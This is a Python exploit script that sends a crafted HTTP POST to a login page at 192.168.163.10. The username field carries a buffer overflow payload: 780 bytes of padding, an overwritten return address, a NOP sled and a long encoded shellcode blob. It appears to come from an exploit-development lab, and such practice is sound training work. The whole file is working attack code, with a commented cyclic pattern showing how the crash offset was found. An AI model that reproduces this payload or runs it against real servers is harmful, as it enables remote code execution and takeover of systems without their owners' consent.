#!/usr/bin/python
import socket, time, sys

try:
    
    
    size = 100

    print("\nSending Evil Buffer...")

    filler = "A" * 780
    eip = "\x83\x0c\x09\x10"
    offset = "C" * 4
    buffer = "D" * (1500 - len(filler) - len(eip) - len(offset))
    shellcode = ("\xbd\x5b\x88\xbd\x0c\xd9\xc8\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x52\x31\x6b\x12\x03\x6b\x12\x83\x98\x8c\x5f\xf9\xe2\x65\x1d"
"\x02\x1a\x76\x42\x8a\xff\x47\x42\xe8\x74\xf7\x72\x7a\xd8\xf4"
"\xf9\x2e\xc8\x8f\x8c\xe6\xff\x38\x3a\xd1\xce\xb9\x17\x21\x51"
"\x3a\x6a\x76\xb1\x03\xa5\x8b\xb0\x44\xd8\x66\xe0\x1d\x96\xd5"
"\x14\x29\xe2\xe5\x9f\x61\xe2\x6d\x7c\x31\x05\x5f\xd3\x49\x5c"
"\x7f\xd2\x9e\xd4\x36\xcc\xc3\xd1\x81\x67\x37\xad\x13\xa1\x09"
"\x4e\xbf\x8c\xa5\xbd\xc1\xc9\x02\x5e\xb4\x23\x71\xe3\xcf\xf0"
"\x0b\x3f\x45\xe2\xac\xb4\xfd\xce\x4d\x18\x9b\x85\x42\xd5\xef"
"\xc1\x46\xe8\x3c\x7a\x72\x61\xc3\xac\xf2\x31\xe0\x68\x5e\xe1"
"\x89\x29\x3a\x44\xb5\x29\xe5\x39\x13\x22\x08\x2d\x2e\x69\x45"
"\x82\x03\x91\x95\x8c\x14\xe2\xa7\x13\x8f\x6c\x84\xdc\x09\x6b"
"\xeb\xf6\xee\xe3\x12\xf9\x0e\x2a\xd1\xad\x5e\x44\xf0\xcd\x34"
"\x94\xfd\x1b\x9a\xc4\x51\xf4\x5b\xb4\x11\xa4\x33\xde\x9d\x9b"
"\x24\xe1\x77\xb4\xcf\x18\x10\x7b\xa7\x55\x43\x13\xba\x99\x82"
"\x5f\x33\x7f\xee\x8f\x12\x28\x87\x36\x3f\xa2\x36\xb6\x95\xcf"
"\x79\x3c\x1a\x30\x37\xb5\x57\x22\xa0\x35\x22\x18\x67\x49\x98"
"\x34\xeb\xd8\x47\xc4\x62\xc1\xdf\x93\x23\x37\x16\x71\xde\x6e"
"\x80\x67\x23\xf6\xeb\x23\xf8\xcb\xf2\xaa\x8d\x70\xd1\xbc\x4b"
"\x78\x5d\xe8\x03\x2f\x0b\x46\xe2\x99\xfd\x30\xbc\x76\x54\xd4"
"\x39\xb5\x67\xa2\x45\x90\x11\x4a\xf7\x4d\x64\x75\x38\x1a\x60"
"\x0e\x24\xba\x8f\xc5\xec\xca\xc5\x47\x44\x43\x80\x12\xd4\x0e"
"\x33\xc9\x1b\x37\xb0\xfb\xe3\xcc\xa8\x8e\xe6\x89\x6e\x63\x9b"
"\x82\x1a\x83\x08\xa2\x0e")

    nops = "\x90" * 10
    inputBuffer = filler + eip + offset + nops + shellcode
    #inputBuffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba"

    content = "username=" + inputBuffer + "&password=A"

    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 192.168.163.10\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://192.168.163.10/login\r\n" 
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"

    buffer += content

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.163.10', 80))
    s.send(buffer)

    s.close()
    size += 100
    time.sleep(10)
    print("\nDone!")

except Exception as e: 
    print(e)
    print("Could not connect!")
    sys.exit()